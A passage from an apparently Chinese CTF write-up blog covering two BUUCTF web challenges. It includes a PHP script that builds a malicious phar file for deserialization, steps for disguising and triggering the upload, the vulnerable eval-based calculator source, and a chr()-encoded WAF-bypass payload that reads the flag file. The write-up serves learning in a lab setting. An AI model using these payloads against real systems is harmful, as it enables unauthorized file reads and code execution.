<p>其中<code>$file-&gt;delete()</code>时便执行了<code>unlink()</code>函数。</p>
<p>那么我们上传一个<code>phar</code>文件，再去删除它，此处便可以控制通过<code>phar://</code>执行了我们上传的<code>phar</code>文件，便将文件中序列化的内容反序列化了，利用这个部分，我们便可以构造<code>phar</code>文件，来读取flag文件了。</p>
<h3 id="构造phar文件"><a href="#构造phar文件" class="headerlink" title="构造phar文件"></a>构造phar文件</h3><p>网上找到了构造<code>phar</code>文件的脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>首先上传构造好的<code>phar</code>文件，这里需要注意：<strong>phar文件上传的时候必须伪装成image文件</strong>，通过BP抓包上传：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web23.png" alt=""><br><img src="http://www.ggb0n.cool/images/BUUCTF-web24.png" alt=""><br>然后删除文件，此时抓包，然后把要删除的文件名改为<code>phar://phar.png/exp.txt</code>，然后即可拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web25.png" alt=""></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>网上有说这道题跟<code>HTTP协议走私</code>有关联，之前看过http走私的文章，但我觉得的更多的考察的就是参数过滤的绕过还有对输入字符做限制时候的绕过。<br>不过这里可以再学习一下<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">http走私</a>，还学到了一些<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a>的方法。</p>
<h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目查看源码发现<code>clac.php?num</code>被ban了，同时在<code>calc.php</code>中可以拿到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先对传参<code>num</code>进行了过滤，但是要想读出flag，又必须用<code>num</code>传参，这时候想到利用空格的绕过方法。补充一点知识：</p>
<blockquote>
<p>php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p>
</blockquote>
<p>也就是说利用<code>num</code>传参就可以了。<br>我们还看到<code>/</code>也被ban了，再想要查看目录下的内容，就需要借助一些系统函数了。利用<code>chr()</code>函数即可借助数字来构造被ban的字符，来最终读取flag，最终payload如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>))</span><br></pre></td></tr></table></figure>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ggb0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://ggb0n.cool/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/">http://ggb0n.cool/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a><a class="post-meta__tags" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a><a class="post-meta__tags" href="/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">哈希长度扩展攻击</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/302%E8%B7%B3%E8%BD%AC/">302跳转</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a><a class="post-meta__tags" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">phar反序列化漏洞</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">反序列化逃逸漏洞</a><a class="post-meta__tags" href="/tags/http%E5%8D%8F%E8%AE%AE%E8%B5%B0%E7%A7%81/">http协议走私</a><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/user-ini%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">user.ini上传漏洞</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://ggb0n.cool/images/emFuc2hhbmc=.png"><div class="post-qr-code__desc">多谢大佬支持~</div></div></div><div class="social-share pull-right" data-disabled="douban,diandian,google,linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"><i class="fa fa-chevron-left">  </i><span>BUUCTF-web刷题Ⅱ</span></a></div><div class="next-post pull-right"><a href="/2020/02/04/HackTM2020-WriteUp/"><span>HackTM2020-WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(http://www.ggb0n.cool/images/back2.png)"><div class="layout" id="footer"><div class="copyright">&copy;2020 by ggb0n</div><div class="footer_custom_text">一生一世，爱你一人。</div><div class="icp"><a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener"><span>豫ICP备20003023号</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>